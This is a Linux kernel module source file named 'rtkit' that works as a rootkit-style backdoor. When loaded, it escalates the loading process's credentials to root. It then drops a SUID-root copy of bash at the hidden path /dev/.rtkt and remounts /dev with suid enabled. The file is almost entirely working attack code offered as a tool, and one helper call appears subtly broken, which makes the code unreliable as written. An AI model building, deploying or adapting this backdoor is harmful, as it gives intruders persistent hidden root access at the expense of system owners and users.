#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/cred.h>
#include <linux/kmod.h>
#define x20 "/dev/.rtkt" //payload path
MODULE_LICENSE("GPL");

static int __init rtkit(void){
		struct cred *new = prepare_creds();
		if (new) {
				new->uid.val = 0;
				new->gid.val = 0;
				new->euid.val = 0;
				new->egid.val = 0;
				new->fsuid.val = 0;
//        		new->fguid.val = 0;		
				commit_creds(new);
				printk(KERN_INFO "[rtkit] UID escalated to 0\n");
				//environment
				char *envp[] = {"HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
				// cp /bin/bash to payload
				char *argv1[] = {"/bin/cp", "/bin/bash", x20, NULL};
				call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC);
				//chown current whoami
				char *argv2[] = {"/bin/sh", "-c", "U=$(/usr/bin/whoami); chown $U:$U " x20, NULL};
				call_usermodehelper(argv2[2], argv2, envp, UMH_WAIT_PROC);
				//chmod 4755
    			char *argv3[] = { "/bin/chmod", "4755", x20, NULL };
    			call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC);
				//  remount with suid access
				char *argv4[] = { "/bin/mount", "-o", "remount,suid", "/dev", NULL };
				call_usermodehelper(argv4[0], argv4, envp, UMH_WAIT_EXEC);  // must use UMH_WAIT_EXEC
				printk(KERN_INFO "[rtkit] dropped at %s\n", x20);
	}
	return 0;
}
//module cleanup
static void  __exit rtkitCleanUp(void){
		printk("[rtkit] cleanup");
}
module_init(rtkit); //insmod
module_exit(rtkitCleanUp); //rmmod

